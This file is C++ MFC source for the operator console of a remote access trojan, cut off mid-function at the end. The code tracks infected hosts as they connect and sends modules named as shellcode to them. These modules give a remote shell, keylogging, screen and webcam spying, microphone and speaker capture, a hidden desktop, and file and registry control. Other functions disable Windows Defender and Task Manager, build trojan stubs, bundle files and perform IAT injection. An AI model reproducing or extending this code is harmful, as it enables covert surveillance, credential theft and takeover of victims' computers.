void CnbclassDlg::OnNMRClickLogview(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_LOG);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);


	if (m_LogList.GetSelectedCount() == 0)       //如果没有选中
	{
		//没选中删除选中行菜单禁用
		pM->EnableMenuItem(1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
	}

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;

}

/// <summary>
/// 连接列表右键弹菜单
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CnbclassDlg::OnNMRClickConnectview(NMHDR* pNMHDR, LRESULT* pResult)
{


	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_CONNECT);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_ConnectList.GetSelectedCount() == 0)       //如果没有选中
	{
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}

	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}

/// <summary>
/// 清空日志列表
/// </summary>
void CnbclassDlg::OnLogClear()
{
	m_LogList.DeleteAllItems();
	// TODO: 在此添加命令处理程序代码
}

/// <summary>
/// 删除选中行
/// </summary>
void CnbclassDlg::OnLogDeleteSelect()
{
	POSITION pos = m_LogList.GetFirstSelectedItemPosition();
	while (pos)
	{
		int nSelected = m_LogList.GetNextSelectedItem(pos); //获取选中行的索引
		m_LogList.DeleteItem(nSelected); //根据索引删除
		pos = m_LogList.GetFirstSelectedItemPosition();
	}
}

/// <summary>
/// 菜单设置配置被点击
/// </summary>
void CnbclassDlg::OnSetConfig()
{
	CSetingDlg m_CSetingDlg;
	m_CSetingDlg.DoModal();
}

/// <summary>
/// 上线包信息添加到列表中
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnAddtolist(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	if (pContext == NULL)
		return -1;
	
	CString	strToolTipsText, strOS, strLogText;

	try
	{

		LOGININFO* LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		CString	str;

		int nCnt = m_ConnectList.GetItemCount();

		int i = 0;

		i = m_ConnectList.InsertItem(nCnt, str, 15);

		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

		m_ConnectList.SetItemText(i, CONNECT_WIP, IPAddress);

		// 内网IP
		m_ConnectList.SetItemText(i, CONNECT_NIP, inet_ntoa(LoginInfo->nIPAddress));

		// 主机名
		m_ConnectList.SetItemText(i, CONNECT_NAME, LoginInfo->HostName);

		//设置备注信息
		m_ConnectList.SetItemText(i, CONNECT_BZ, LoginInfo->Remark);

		//设置安装日期
		m_ConnectList.SetItemText(i, CONNECT_INS, LoginInfo->InstallTime);
		
		//用户名
		m_ConnectList.SetItemText(i, CONNECT_USER, LoginInfo->UserName);
		////////////////////////////////////////////////////////////////////////////////////////
		// 操作系统
		m_ConnectList.SetItemText(i, CONNECT_OS, LoginInfo->Os);
		//cpu
		str.Format(_T("%d*%dMHz"),LoginInfo->CPUNumber, LoginInfo->CPUClockMhz);
		m_ConnectList.SetItemText(i, CONNECT_CPU, str);
		
		//内存大小
		str.Format(_T("%dMB"), LoginInfo->MemSize);
		m_ConnectList.SetItemText(i, CONNECT_RAM, str);
		//硬盘
		str.Format(_T("%dGB"), LoginInfo->HD);
		m_ConnectList.SetItemText(i, CONNECT_HD, str);

		// 延迟
		str.Format(_T("%d"), LoginInfo->dwSpeed);
		m_ConnectList.SetItemText(i, CONNECT_PING, str);

		//摄像头
		str = LoginInfo->bIsWebCam ? _T("Yes") : _T("No");
		m_ConnectList.SetItemText(i, CONNECT_VIDEO, str);


		if (((CnbclassApp*)AfxGetApp())->m_bIsQQwryExist)
		{
			//地理位置
			str = m_QQwry->IPtoAdd(IPAddress);
			m_ConnectList.SetItemText(i, CONNECT_GIS, str);
			strToolTipsText += _T("\nArea	: ");
			strToolTipsText += str;
		}
		else
		{
			m_ConnectList.SetItemText(i, CONNECT_GIS, _T("无纯真数据库"));
		}

		//杀毒
		m_ConnectList.SetItemText(i, CONNECT_AV, LoginInfo->Virus);

		//设置结构地址
		CString Con;
		Con.Format("%d", pContext);
		m_ConnectList.SetItemText(i, CONNECT_CONTEXT, Con);
		//m_ConnectList.SetItemData(i, (DWORD)pContext);
		
		//重复上线问题
		int Tmpi = 0;
		for (Tmpi = 0; Tmpi < nCnt; Tmpi++)
		{
			if (m_ConnectList.GetItemText(nCnt, 0) == m_ConnectList.GetItemText(Tmpi, 0))//先判断外网IP
			{
				if (m_ConnectList.GetItemText(nCnt, 1) == m_ConnectList.GetItemText(Tmpi, 1))//再判断内网IP
				{
					m_ConnectList.DeleteItem(Tmpi);
				}
			}
		}
		CString strOSCount = LoginInfo->Os;

		if (strOSCount.Find(_T("7")) != -1)
		{
			g_pCnbclassDlg->nOSCount[0]++;
		}
		else if (strOSCount.Find(_T("8")) != -1)
		{
			g_pCnbclassDlg->nOSCount[1]++;
		}
		else if (strOSCount.Find(_T("10")) != -1)
		{
			g_pCnbclassDlg->nOSCount[2]++;
		}
		else if (strOSCount.Find(_T("11")) != -1)
		{
			g_pCnbclassDlg->nOSCount[3]++;
		}
		else if (strOSCount.Find(_T("2008")) != -1)
		{
			g_pCnbclassDlg->nOSCount[4]++;
		}
		else if (strOSCount.Find(_T("2012")) != -1)
		{
			g_pCnbclassDlg->nOSCount[5]++;
		}
		else if (strOSCount.Find(_T("2016")) != -1)
		{
			g_pCnbclassDlg->nOSCount[6]++;
		}
		else if (strOSCount.Find(_T("2019")) != -1)
		{
			g_pCnbclassDlg->nOSCount[7]++;
		}
		else
		{
			g_pCnbclassDlg->nOSCount[8]++;
		}

		// 更新当前连接总数
		CString stros;
		stros.Format(_T("\t连接: %d"), m_ConnectList.GetItemCount());
		m_wndStatusBar.SetPaneText(3, stros);
		stros.Format(_T("\tWin7:[%d]  Win8:[%d]  Win10:[%d]  Win11:[%d]  Win2008:[%d]  Win2012:[%d]  Win2016:[%d]  Win2019:[%d]  未知:[%d]"),
			nOSCount[0],
			nOSCount[1],
			nOSCount[2],
			nOSCount[3],
			nOSCount[4],
			nOSCount[5],
			nOSCount[6],
			nOSCount[7],
			nOSCount[8]);
		m_wndStatusBar.SetPaneText(2, stros);


		if (((CnbclassApp*)AfxGetApp())->m_bIsQQwryExist)
			strLogText.Format("IP:[%s]   OS: [%s]   地理位置: [%s] 权限: [%s]", IPAddress, LoginInfo->Os,  str, LoginInfo->UserName);
		else
			strLogText.Format("IP:[%s]   OS: [%s]  权限: [%s]", IPAddress, LoginInfo->Os, LoginInfo->UserName);
		
		ShowLog("主机上线", strLogText, LIST_IMG_INDEX_UP);

		//播放上线音乐
		PlaySound(MAKEINTRESOURCE(IDR_LOGIN), AfxGetResourceHandle(), SND_ASYNC | SND_RESOURCE | SND_NODEFAULT);
	}
	catch (...) {}
	
	return 0;
}


/// <summary>
/// 终端管理
/// </summary>
void CnbclassDlg::OnShell()
{

	SendSelectCommandPuls(COMMAND_SHELL);
}

//打开shell框
afx_msg LRESULT CnbclassDlg::OnOpenshelldialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CShellDlg* dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;

}

//更该备注
void CnbclassDlg::OnConnectBeiZhu()
{
	CString beizhu;
	CBzDlg m_bzdle;
	m_bzdle.DoModal();

	if (IDOK)
	{
		UpdateData(TRUE);
		beizhu = m_bzdle.m_beizhu;
		UpdateData(false);
		BYTE bToken[0x33] = { 0 };
		bToken[0] = COMMAND_REMARK;
		RtlCopyMemory(&bToken[1], beizhu.GetBuffer(), beizhu.GetLength());
		SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
		if (m_ConnectList.GetSelectedCount() < 1)
		{
			return;
		}
		// TODO: Add your command handler code here
		POSITION pos = m_ConnectList.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
		//遍历所有选中批量执行
		while (pos) //so long as we have a valid POSITION, we keep iterating
		{
			int	nItem = m_ConnectList.GetNextSelectedItem(pos);
			m_ConnectList.SetItemText(nItem, CONNECT_BZ, beizhu);
		} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
	}

}

/// <summary>
/// 点击菜单卸载
/// </summary>
void CnbclassDlg::OnRemove()
{
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
	// TODO: 在此添加命令处理程序代码
}

//删除下线主机
afx_msg LRESULT CnbclassDlg::OnRemovefromlist(WPARAM wParam, LPARAM lParam)
{

	ClientContext* pContext = (ClientContext*)lParam;
	if (pContext == NULL)
		return -1;


	CString strOSCount, strLogText, strVersion, IPaddress, strAddr;
	int nTabs = m_ConnectList.GetItemCount();
	for (int n = 0; n < nTabs; n++)
	{
		try
		{
			int nCnt = m_ConnectList.GetItemCount();
			for (int i = 0; i < nCnt; i++)
			{

				CString con = m_ConnectList.GetItemText(i, CONNECT_CONTEXT);
				ClientContext* conn = (ClientContext*)atoi(con);
				//if (pContext == (ClientContext*)m_ConnectList.GetItemData(i))
				if (pContext == conn)
				{
					strOSCount = m_ConnectList.GetItemText(i, CONNECT_OS);
					IPaddress = m_ConnectList.GetItemText(i, CONNECT_WIP);
					strLogText.Format("IP: [%s]   OS: [%s] ", IPaddress, strOSCount, strVersion, strAddr);
					ShowLog("主机下线", strLogText, LIST_IMG_INDEX_DWON);
					m_ConnectList.DeleteItem(i);
					PlaySound(MAKEINTRESOURCE(IDR_DOWN), AfxGetResourceHandle(), SND_ASYNC | SND_RESOURCE | SND_NODEFAULT);

					if (strOSCount.Find(_T("7")) != -1)
					{
						g_pCnbclassDlg->nOSCount[0]--;
					}
					else if (strOSCount.Find(_T("8")) != -1)
					{
						g_pCnbclassDlg->nOSCount[1]--;
					}
					else if (strOSCount.Find(_T("10")) != -1)
					{
						g_pCnbclassDlg->nOSCount[2]--;
					}
					else if (strOSCount.Find(_T("11")) != -1)
					{
						g_pCnbclassDlg->nOSCount[3]--;
					}
					else if (strOSCount.Find(_T("2008")) != -1)
					{
						g_pCnbclassDlg->nOSCount[4]--;
					}
					else if (strOSCount.Find(_T("2012")) != -1)
					{
						g_pCnbclassDlg->nOSCount[5]--;
					}
					else if (strOSCount.Find(_T("2016")) != -1)
					{
						g_pCnbclassDlg->nOSCount[6]--;
					}
					else if (strOSCount.Find(_T("2019")) != -1)
					{
						g_pCnbclassDlg->nOSCount[7]--;
					}
					else
					{
						g_pCnbclassDlg->nOSCount[8]--;
					}

					break;
				}
			}
		}
		catch (...) {}
	}

	// 更新当前连接总数
	CString str;
	str.Format(_T("\t连接: %d"), m_ConnectList.GetItemCount());
	m_wndStatusBar.SetPaneText(3, str);

	str.Format(_T("\tWin7:[%d]  Win8:[%d]  Win10:[%d]  Win11:[%d]  Win2008:[%d]  Win2012:[%d]  Win2016:[%d]  Win2019:[%d]  未知:[%d]"),
		nOSCount[0],
		nOSCount[1],
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8]);
	m_wndStatusBar.SetPaneText(2, str);

	// 关闭相关窗口
	switch (pContext->m_Dialog[0])
	{

		case WEBCAM_DLG:
		case AUDIO_DLG:
		case KEYBOARD_DLG:
		case SYSTEM_DLG:
		case SERMANAGER_DLG:
		case SHELL_DLG:
		case REGEDIT_DLG:
		case FILEMANAGER_DLG:
		case SCREENSPY_DLG:
		case SPEAKER_DLG:
		case SYSINFO_DLG:
		case TASK_DLG:
		case DESKTOP_DLG:
		case OLDSCREENSPY_DLG:
			::PostMessage(((CDialog*)pContext->m_Dialog[1])->GetSafeHwnd(), WM_CLOSE, NULL, NULL);
		break;
	default:
		break;
	}

	return 0;
}

/// <summary>
/// 点击系统管理
/// </summary>
void CnbclassDlg::OnSystem()
{
	SendSelectCommandPuls(COMMAND_SYSTEM);
}


/// <summary>
/// 打开系统管理对话框
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenpslistdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CSystemDlg* dlg = new CSystemDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 打开服务管理对话框
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenpserlistdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CServerManager* dlg = new CServerManager(this, m_iocpServer, pContext);
	//设置父窗口为卓面
	dlg->Create(IDD_SERVERDLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 请求服务管理
/// </summary>
void CnbclassDlg::OnServer()
{
	SendSelectCommandPuls(COMMAND_SERMANAGER);
}

/// <summary>
/// 打开注册表管理窗口
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenregeditdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CRegDlg* dlg = new CRegDlg(this, m_iocpServer, pContext);
	//设置父窗口为卓面
	dlg->Create(IDD_REGDLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 打开文件管理
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CFileDlg* dlg = new CFileDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILEDLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}


/// <summary>
/// 打开屏幕监控
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOnopenscreenspydialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext* pContext = (ClientContext*)lParam;

	CScreenSpyDlg* dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

/// <summary>
/// 监听麦克风
/// </summary>
void CnbclassDlg::OnSoundPut()
{

	SendSelectCommandPuls(COMMAND_AUDIO);
}

/// <summary>
/// 监听扬声器
/// </summary>
void CnbclassDlg::OnSoundPop()
{

	SendSelectCommandPuls(COMMAND_SPEAKER);
}

/// <summary>
/// 扬声器监听窗口
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CSpeakerDlg* dlg = new CSpeakerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SPEAKER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SPEAKER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


/// <summary>
/// 麦克风监听
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenaudiodialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CAudioDlg* dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 点击视频查看
/// </summary>
void CnbclassDlg::OnConnectVideo()
{

	SendSelectCommandPuls(COMMAND_WEBCAM);
}

/// <summary>
/// 摄像头对话框
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	CVideoDlg* dlg = new CVideoDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_VIDEO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 主机管理
/// </summary>
void CnbclassDlg::OnSysInfo()
{
	SendSelectCommandPuls(COMMAND_SYSINFO);
}

/// <summary>
/// 主机管理窗口
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpensysinfodialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CSysinfo* dlg = new CSysinfo(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SYSINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SYSINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 屏幕截图
/// </summary>
void CnbclassDlg::OnScreenshots()
{
	SendSelectCommandPuls(COMMAND_GN);
	Index = DESK_TOP;
}

/// <summary>
/// 计划任务
/// </summary>
void CnbclassDlg::OnTask()
{

	SendSelectCommandPuls(COMMAND_TASK);
}

/// <summary>
/// 计划任务窗口
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpentaskdialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CTaskDlg* dlg = new CTaskDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_TASKDLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = TASK_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 屏幕监控
/// </summary>
void CnbclassDlg::OnLookSpy()
{
	SendSelectCommandPuls(COMMAND_SCREEN_SPY);

}

/// <summary>
/// 注册表
/// </summary>
void CnbclassDlg::OnReg()
{
	SendSelectCommandPuls(COMMAND_REGEDIT);

}

/// <summary>
/// 文件管理
/// </summary>
void CnbclassDlg::OnFile()
{
	
	SendSelectCommandPuls(COMMAND_LIST_DRIVE);
	//SendSelectCommand(&bToken, sizeof(BYTE));
}

/// <summary>
/// 关机
/// </summary>
void CnbclassDlg::OnShutdown()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

/// <summary>
/// 重启
/// </summary>
void CnbclassDlg::OnReboot()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

/// <summary>
/// 注销
/// </summary>
void CnbclassDlg::OnLogoff()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));

}

//发送命令的升级版
void CnbclassDlg::SendSelectCommandPuls(BYTE Falg)
{

	if (m_ConnectList.GetSelectedCount() < 1)
	{
		return;
	}

	LPBYTE buff = (LPBYTE)LocalAlloc(LPTR, sizeof(ShellcodeStr)+1);
	
	if (!buff)
	{
		return;
	}

	buff[0] = Falg;

	switch (Falg)
	{
		case COMMAND_LIST_DRIVE:
			memcpy(&buff[1],filecode,sizeof(ShellcodeStr));
			break;
		case COMMAND_REGEDIT:
			memcpy(&buff[1], regcode, sizeof(ShellcodeStr));
			break;
		case COMMAND_SCREEN_SPY:   //屏幕
			memcpy(&buff[1], pingmu, sizeof(ShellcodeStr));
			break;
		case COMMAND_TASK:
			memcpy(&buff[1], taskcode, sizeof(ShellcodeStr));
			break;
		case COMMAND_SYSINFO:
			memcpy(&buff[1], infocode, sizeof(ShellcodeStr));
			break;
		case COMMAND_WEBCAM:
			memcpy(&buff[1], shipin, sizeof(ShellcodeStr));
			break;
		case COMMAND_SPEAKER:
			memcpy(&buff[1], yangshengqi, sizeof(ShellcodeStr));
			break;
		case COMMAND_AUDIO:
			memcpy(&buff[1], maikefeng, sizeof(ShellcodeStr));
			break;
		case COMMAND_SERMANAGER:
			memcpy(&buff[1], servercode, sizeof(ShellcodeStr));
			break;
		case COMMAND_SYSTEM:
			memcpy(&buff[1], systemcode, sizeof(ShellcodeStr));
			break;
		case COMMAND_SHELL:
			memcpy(&buff[1], cmdcode, sizeof(ShellcodeStr));
			break;
		case COMMAND_KEYBOARD:
			memcpy(&buff[1], keycode, sizeof(ShellcodeStr));
			break;
		case COMMAND_DESKTOP:
			memcpy(&buff[1], houtai, sizeof(ShellcodeStr));
			break;	
		case COMMAND_GN:
			memcpy(&buff[1], toolscode, sizeof(ShellcodeStr));
			break;
		case COMMAND_OLDPINGMU:
			memcpy(&buff[1], oldpingmu, sizeof(ShellcodeStr));
			break;
		default:
			break;
	}

	// TODO: Add your command handler code here
	POSITION pos = m_ConnectList.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	//遍历所有选中批量执行
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_ConnectList.GetNextSelectedItem(pos);
		CString con = m_ConnectList.GetItemText(nItem, CONNECT_CONTEXT);
		ClientContext* conn = (ClientContext*)atoi(con);
		//ClientContext* pContext = (ClientContext*)m_ConnectList.GetItemData(nItem);
		ClientContext* pContext = conn;
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, buff, sizeof(ShellcodeStr) + 1);
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	

	LocalFree(buff);
}

/// <summary>
/// 生成小马
/// </summary>
void CnbclassDlg::OnGenerate()
{
	CGenerate dlg;
	dlg.DoModal();
}

/// <summary>
/// 键盘记录对话框
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CKeyboard * dlg = new CKeyboard(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 键盘记录
/// </summary>
void CnbclassDlg::OnConnectKey()
{
	SendSelectCommandPuls(COMMAND_KEYBOARD);
}

/// <summary>
/// 文件捆绑
/// </summary>
void CnbclassDlg::OnFileBundle()
{
	CBundleDlg dlg;
	dlg.DoModal();
}

/// <summary>
/// 点击后台界面
/// </summary>
void CnbclassDlg::OnDesktop()
{
	SendSelectCommandPuls(COMMAND_DESKTOP);
}

/// <summary>
/// 打开后台桌面窗口
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnOpendesktopspydialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CDesktopDlg* dlg = new CDesktopDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_DESKTOPSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = DESKTOP_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 打开实用功能类
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnToolsclass(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	CTools dlg(this->m_hWnd, m_iocpServer, pContext,Index);
	pContext->m_Dialog[0] = TOOLS_DLG;
	pContext->m_Dialog[1] = (int)(&dlg);
	WaitForSingleObject(dlg.m_event,20000);
	return 0;
}

/// <summary>
/// 托盘回调
/// </summary>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>
afx_msg LRESULT CnbclassDlg::OnNotifyMain(WPARAM wParam, LPARAM lParam)
{
	switch (lParam)
	{
		case WM_LBUTTONUP:
		{
			AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOWNORMAL);
			SetForegroundWindow();
			break;
		}
		
		case WM_RBUTTONUP:
		{
			//弹出菜单
			CPoint pos;
			if (GetCursorPos(&pos))
			{
				CMenu menu;
				//加载菜单资源
				menu.LoadMenu(IDR_TUOPAN);
				//目标子菜单是菜单资源第0列
				menu.GetSubMenu(0)->TrackPopupMenu(TPM_RIGHTBUTTON, pos.x, pos.y, this);
			}
			break;
		}	
	}

	return 1;
}

/// <summary>
/// 退出程序
/// </summary>
void CnbclassDlg::OnTuopanExit()
{
	Shell_NotifyIcon(NIM_DELETE, &nid);//添加图标到系统状态区域
	ExitProcess(0);
}

/// <summary>
/// 隐藏窗口
/// </summary>
void CnbclassDlg::OnClose()
{
	
	ShowWindow(SW_HIDE);
	
}

HBRUSH CnbclassDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	return hbr;
}

//关于
void CnbclassDlg::Onabout()
{
	CAboutDlg dlg;
	dlg.DoModal();
}

/// <summary>
/// 查看常用命令
/// </summary>
void CnbclassDlg::OnShowCommand()
{
	CShowCommand* dlg = new CShowCommand();
	dlg->Create(IDD_COMMAND, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
}

/// <summary>
/// 打开任务管理器
/// </summary>
void CnbclassDlg::OnOpenTask()
{
	SendSelectCommandPuls(COMMAND_GN);
	Index = ENABLE_TASK;
}

/// <summary>SYSTEMTIME Time = {0};
/// 关闭任务管理器
/// </summary>
void CnbclassDlg::OnDelTask()
{
	SendSelectCommandPuls(COMMAND_GN);
	Index = DISABLE_TASK;
}

//启用def
void CnbclassDlg::OnOpenDef()
{
	SendSelectCommandPuls(COMMAND_GN);
	Index = ENABLE_DEF;
}

//禁用def
void CnbclassDlg::OnCloseDef()
{
	SendSelectCommandPuls(COMMAND_GN);
	Index = DISABLE_DEF;
}



//同意免责声明
void CAboutDlg::OnBnClickedButton1()
{
	UpdateData(1);
	CDialogEx::OnOK();
}

//导入表注入
void CnbclassDlg::OnIATinjection()
{
	CInjection dlg(this);
	dlg.DoModal();
}
extern int strsort_column;	// 记录点击的列

void CnbclassDlg::OnLvnColumnclickConnectview(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	strsort_column = pNMLV->iSubItem;//点击的列
	int count = m_ConnectList.GetItemCount();
	for (int i = 0; i < count; i++)
		m_ConnectList.SetItemData(i, i); // 每行的比较关键字，此处为列序号（点击的列号），可以设置为其他 比较函数的第一二个参数
	m_ConnectList.SortItems(CompareListStrProc, (DWORD_PTR)&m_ConnectList);//排序 第二个参数是比较函数的第三个参数
	*pResult = 0;

}

//打开旧屏幕对话框
afx_msg LRESULT CnbclassDlg::OnOpenoldscreenspydialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	COLDSCREENSPY* dlg = new COLDSCREENSPY(this, m_iocpServer, pContext);

